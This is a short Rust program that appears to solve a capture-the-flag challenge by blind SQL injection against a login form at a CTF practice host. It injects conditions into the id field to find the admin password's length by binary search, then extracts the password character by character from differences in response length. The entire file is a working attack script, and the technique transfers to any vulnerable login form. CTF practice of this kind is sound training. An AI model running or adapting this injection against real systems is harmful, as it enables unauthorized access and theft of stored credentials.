// cargo-deps: reqwest = "0.8.5"

extern crate reqwest;

fn main() {
    let len = search_len(0, 100);
    println!("len: {}", len);

    let passwd = search_passwd(len);
    println!("passwd: {}", passwd);
}

fn search_len(len_min: usize, len_max: usize) -> usize {
    let (mut low, mut high) = (len_min, len_max);

    while low + 1 < high {
        let mid = (low + high) / 2;
        let id = format!(
            "admin' AND (SELECT length(pass) FROM user WHERE id='admin') < {}; --",
            mid
        );
        let response = request(&id, "''");

        if response.len() > 2000 {
            high = mid;
        } else {
            low = mid;
        }
    }

    (low + high) / 2
}

fn search_passwd(len: usize) -> String {
    let mut passwd = String::new();

    for l in 0..len {
        for c in b'0'..(b'z' + 1) {
            let c = c as char;
            let id = format!(
                "admin' AND substr((SELECT pass FROM user WHERE id='admin'), {}, 1) = '{}'; --",
                l + 1,
                c
            );
            let response = request(&id, "''");

            if response.len() > 2000 {
                passwd.push(c);
                break;
            }
        }

        println!("searching passwd: {}", passwd);
    }

    passwd
}

fn request(id: &str, passwd: &str) -> String {
    use reqwest::Client;

    static URL: &str = "http://ctfq.sweetduet.info:10080/~q6/";

    let client = Client::new();
    let params = [("id", id), ("pass", passwd)];

    let mut response = client.post(URL).form(&params).send().unwrap();
    response.text().unwrap()
}
